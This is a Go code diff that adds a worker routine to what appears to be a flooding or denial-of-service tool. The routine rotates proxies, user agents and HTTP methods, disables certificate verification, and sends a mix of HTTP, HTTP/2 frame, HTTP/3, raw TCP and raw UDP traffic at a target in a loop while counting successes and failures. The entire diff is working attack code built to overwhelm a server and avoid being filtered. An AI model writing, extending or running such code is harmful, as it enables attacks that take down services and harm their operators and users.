@@ -599,6 +599,77 @@ func pickMode(mode string) string {
     return m[mrand.Intn(len(m))]
 }   
 
+func worker(jobs <-chan struct{}, config *Config, proxies, agents, methods, paths, mal []string, wg *sync.WaitGroup) {
+    defer wg.Done()
+    
+    tlsConf := &tlsutls.Config{
+        InsecureSkipVerify: true,
+        MinVersion:         tls.VersionTLS12,
+        MaxVersion:         tls.VersionTLS13,
+        CurvePreferences:   []tlsutls.CurveID{tlsutls.X25519, tlsutls.CurveP256, tlsutls.CurveP384},
+    }
+
+    baseURL := config.BaseURL
+    u, _ := url.Parse(baseURL)
+    host := u.Hostname()
+    target := host
+    if u.Port() != "" {
+        target += ":" + u.Port()
+    }
+
+    var client *http.Client
+    if len(proxies) > 0 {
+        client = makeClient(proxies[mrand.Intn(len(proxies))], config.UseHTTP2, tlsConf)
+    } else {
+        client = makeClient("", config.UseHTTP2, tlsConf)
+    }
+
+    for range jobs {
+        mode := pickMode(config.Mode)
+        path := randomPath(paths, mal)
+        
+        switch mode {
+        case "h2f":
+            customHTTP2Frame(target, host, path)
+        case "h3":
+            customHTTP3(target, path)
+        case "rawtcp":
+            rawTCP(target, host, path)
+        case "rawudp":
+            rawUDP(target)
+        default:
+            method := methods[mrand.Intn(len(methods))]
+            ua := agents[mrand.Intn(len(agents))]
+            url := baseURL + path
+            
+            var body io.Reader
+            if method == "POST" || method == "PUT" || method == "PATCH" {
+                body = strings.NewReader(randomPayload())
+            }
+            
+            req, err := http.NewRequestWithContext(ctx, method, url, body)
+            if err != nil {
+                atomic.AddInt64(&total, 1)
+                atomic.AddInt64(&fail, 1)
+                continue
+            }
+            
+            req.Header = randomHeaders(ua, config.BaseURL)
+            
+            resp, err := client.Do(req)
+            atomic.AddInt64(&total, 1)
+            
+            if err == nil && resp != nil {
+                io.Copy(io.Discard, resp.Body)
+                resp.Body.Close()
+                atomic.AddInt64(&success, 1)
+            } else {
+                atomic.AddInt64(&fail, 1)
+            }
+        }
+    }
+}
+
 func workerSuper(jobs <-chan struct{}, config *Config, proxies, agents, methods, paths, mal []string, wg *sync.WaitGroup) {
     defer wg.Done()
     
